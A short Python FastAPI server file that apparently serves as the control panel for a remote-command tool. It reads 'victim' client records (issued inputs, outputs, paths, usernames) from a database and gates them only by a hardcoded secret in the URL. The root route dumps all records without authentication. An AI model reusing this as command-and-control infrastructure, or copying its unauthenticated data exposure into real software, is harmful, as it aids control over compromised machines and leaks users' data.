from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from victim import db


app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# Home Page


@app.get("/")
async def read_item():
    alldata = db.DB.collection.find({})
    return {"status": "success", "client": list(alldata)}


@app.get("/api/{item_id}")
async def our_api_handeler(item_id):
    if item_id == 'suvu-dhs':
        try:
            n = db.DB.collection.count_documents({})
            alldata = db.DB.collection.find({})
            alldata = list(alldata)

            l = []
            for i in alldata:
                if i['_id'] != "client-1":
                    l.append({
                        "_id": i['_id'],
                        "input": i["input"],
                        "isIssued": i["isIssued"],
                        "output": i["output"],
                        "path": i["path"],
                        "time": i["time"],
                        "username": i["username"]
                    },)
            return {"status": True, "client": l, "no_of_client": n-1}
        except:
            return {"status": False, "msg": "Server not found (AWS hang-out)", "no_of_client": 0}
    return {"status": None, "msg": "You are not friend of suvendu"}


# @app.get("/delete/{item_id}")
# async def read_item(item_id):
#     return {"item_id": item_id}
